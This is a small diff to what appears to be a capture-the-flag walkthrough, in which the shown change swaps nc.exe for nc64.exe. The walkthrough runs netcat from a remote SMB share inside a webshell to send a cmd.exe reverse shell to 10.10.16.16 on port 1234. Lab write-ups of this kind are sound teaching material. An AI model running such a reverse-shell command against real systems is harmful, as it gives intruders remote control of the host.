@@ -98,7 +98,7 @@ Note: This is a pretty cool trick I learned and makes things a little faster and
             \/
 
 [+] Successfully connected to webshell.
-C:\xampp\htdocs\gym\upload> \\10.10.16.16\rogue\nc.exe -e cmd.exe 10.10.16.16 1234
+C:\xampp\htdocs\gym\upload> \\10.10.16.16\rogue\nc64.exe -e cmd.exe 10.10.16.16 1234
 ```
 
 By checking through Shaun's files we see an interesting binary.
